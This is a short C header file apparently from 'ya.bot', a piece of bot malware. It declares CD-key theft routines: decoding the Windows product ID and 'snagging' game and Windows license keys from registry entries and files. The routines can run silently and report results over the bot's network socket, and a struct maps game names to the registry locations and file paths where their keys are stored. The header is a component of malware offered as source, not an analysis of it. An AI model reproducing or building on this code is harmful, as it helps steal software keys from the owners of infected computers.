/*  ya.bot  */

#ifndef NO_SNAGCDKEYS
char *DecodeProductKey(BYTE *pbyDigitalProductId);
void snag_cdkeys(SOCKET bsock, char *pszAction, char *pszDestination, bool bSilent, bool bVerbose);
bool snag_wincdkey(SOCKET bsock, char *pszAction, char *pszDestination, bool bSilent, bool bVerbose);

typedef struct SSnagCDKeyList
{
	char *m_pszGameName;
	HKEY m_hKey;
	char *m_pszSubKey;
	char *m_pszValueName;
	bool m_bIsFile;
	char *m_pszFilePath;
	int m_nFileKeyLength;
} SSnagCDKeyList;
#endif